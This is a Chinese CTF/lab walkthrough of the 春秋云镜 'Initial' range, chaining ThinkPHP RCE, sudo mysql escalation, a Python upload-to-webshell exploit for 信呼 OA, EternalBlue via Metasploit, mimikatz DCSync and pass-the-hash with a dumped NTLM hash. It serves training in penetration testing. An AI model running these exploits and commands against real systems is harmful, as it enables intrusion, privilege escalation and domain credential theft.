# 春秋云镜-Initial

  
  
&lt;!--more--&gt;  
## flag01  
利用`ThinkPHP`检测工具，存在`RCE`直接`getshell`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152016791.png)
利用`sudo -l`查看特权命令  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152022082.png)
利用`mysql`进行提权  
`sudo mysql -e &#39;\! whoami&#39;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152023190.png)
`flag01: flag{60b53231-`  
## flag02  
上传`frp`进行代理，  
`./frpc -c frpc.ini`  
继续上传`fscan`扫描内网  
`ifconfig`得到内网地址  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152034928.png)
```bash  
(www-data:/var/www/html) $ ./fscan -h 172.22.1.15/24   
   ___                              _      
  / _ \     ___  ___ _ __ __ _  ___| | __   
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /  
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;      
\____/     |___/\___|_|  \__,_|\___|_|\_\     
                     fscan version: 1.8.3  
start infoscan  
trying RunIcmp2  
The current user permissions unable to send icmp packets  
start ping  
(icmp) Target 172.22.1.2      is alive  
(icmp) Target 172.22.1.15     is alive  
(icmp) Target 172.22.1.18     is alive  
(icmp) Target 172.22.1.21     is alive  
[*] Icmp alive hosts len is: 4  
172.22.1.15:80 open  
172.22.1.15:22 open  
172.22.1.18:3306 open  
172.22.1.21:445 open  
172.22.1.18:445 open  
172.22.1.2:445 open  
172.22.1.21:139 open  
172.22.1.18:139 open  
172.22.1.2:139 open  
172.22.1.21:135 open  
172.22.1.18:135 open  
172.22.1.2:135 open  
172.22.1.18:80 open  
172.22.1.2:88 open  
[*] alive ports len is: 14  
start vulscan  
[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin  
[*] NetInfo   
[*]172.22.1.2  
   [-&gt;]DC01  
   [-&gt;]172.22.1.2  
[*] NetInfo   
[*]172.22.1.18  
   [-&gt;]XIAORANG-OA01  
   [-&gt;]172.22.1.18  
[*] NetInfo   
[*]172.22.1.21  
   [-&gt;]XIAORANG-WIN7  
   [-&gt;]172.22.1.21  
[&#43;] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)  
[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)  
[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1  
[*] NetBios 172.22.1.2      [&#43;] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393  
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600  
[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login  
[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统  
[&#43;] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1  
已完成 14/14  
[*] 扫描结束,耗时: 9.743368418s  
```  
有三台机器在域内  
```bash  
*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1  
  
[*] NetBios 172.22.1.2      [&#43;] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393  
  
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600  
```  
其中`172.22.1.2`是`DC`，  
存在`信呼协同办公系统`先打这个  
```python  
# 1.php为webshell  
  
# 需要修改以下内容：  
# url_pre = &#39;http://&lt;IP&gt;/&#39;  
# &#39;adminuser&#39;: &#39;&lt;ADMINUSER_BASE64&gt;&#39;,  
# &#39;adminpass&#39;: &#39;&lt;ADMINPASS_BASE64&gt;&#39;,  
  
import requests  
  
session = requests.session()  
url_pre = &#39;http://172.22.1.18/&#39;  
url1 = url_pre &#43; &#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;  
url2 = url_pre &#43; &#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;  
# url3 = url_pre &#43; &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#39;  
data1 = {  
    &#39;rempass&#39;: &#39;0&#39;,  
    &#39;jmpass&#39;: &#39;false&#39;,  
    &#39;device&#39;: &#39;1625884034525&#39;,  
    &#39;ltype&#39;: &#39;0&#39;,  
    &#39;adminuser&#39;: &#39;YWRtaW4=&#39;,  
    &#39;adminpass&#39;: &#39;YWRtaW4xMjM=&#39;,  
    &#39;yanzm&#39;: &#39;&#39;      
}  
  
r = session.post(url1, data=data1)  
r = session.post(url2, files={&#39;file&#39;: open(&#39;1.php&#39;, &#39;r&#43;&#39;)})  
filepath = str(r.json()[&#39;filepath&#39;])  
filepath = &#34;/&#34; &#43; filepath.split(&#39;.uptemp&#39;)[0] &#43; &#39;.php&#39;  
print(filepath)  
id = r.json()[&#39;id&#39;]  
url3 = url_pre &#43; f&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}&#39;  
r = session.get(url3)  
r = session.get(url_pre &#43; filepath &#43; &#34;?1=system(&#39;dir&#39;);&#34;)  
print(r.text)  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152048679.png)
`flag02: 2ce3-4813-87d4-`  
## flag03  
接下来利用`MS17-010`攻击`172.22.1.21`这台机器  
直接利用`msf`中的`MS17-010`利用工具  
```  
use exploit/windows/smb/ms17_010_eternalblue  
set payload windows/x64/meterpreter/bind_tcp_uuid  
set RHOSTS 172.22.1.21  
exploit  
```  
成功反弹`shell`，并且是最高权限  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152128864.png)
这台机器在域中，并且我们获得了最高权限，直接打DCSync尝试同步DC域的数据，dump hash  
直接利用`msf`中的`mimikatz`  
```  
load kiwi  
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152134566.png)
域控DC开启了`445`和`135`端口，直接打`pth`  
`python3 wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152145901.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504152146740.png)
`flag03: e8f88d0d43d6}`  
## Reference  
https://tttang.com/archive/1634/  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/  

